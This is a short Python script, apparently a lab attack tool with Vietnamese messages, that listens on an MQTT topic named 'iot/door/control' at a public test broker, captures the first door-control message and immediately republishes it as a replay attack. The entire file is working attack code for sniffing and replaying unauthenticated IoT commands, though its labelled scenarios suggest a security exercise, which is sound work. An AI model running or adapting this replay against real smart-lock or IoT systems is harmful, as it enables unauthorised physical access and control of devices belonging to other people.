import paho.mqtt.client as mqtt
import time

BROKER = "test.mosquitto.org"
PORT = 1883
TOPIC = "iot/door/control"
attack_done = False

def on_message(client, userdata, msg):
    global attack_done
    if attack_done: return

    payload = msg.payload.decode('utf-8')
    print("\n==================================================")
    print(f"[!] (KB-01) KẺ TẤN CÔNG ĐÃ BẮT TRỘM ĐƯỢC GÓI TIN:")
    print(payload)
    
    print("\n[*] (KB-03) Đang tiến hành Immediate Replay...")
    # Phát lại ngay lập tức nguyên bản gói tin vừa bắt được
    client.publish(TOPIC, payload)
    print("[V] Đã phát lại thành công! Chờ xem Gateway phản hồi...")
    print("==================================================")
    
    attack_done = True
    time.sleep(1)
    client.disconnect()

client = mqtt.Client()
client.on_message = on_message

try:
    client.connect(BROKER, PORT, 60)
    client.subscribe(TOPIC)
    print("--- KHỞI ĐỘNG ATTACKER (Dùng chung cho KB-01 & KB-03) ---")
    print(f"[*] Đang lắng nghe và rình mò trên topic: {TOPIC}...")
    client.loop_forever()
except KeyboardInterrupt:
    print("\n[*] Tắt công cụ tấn công.")
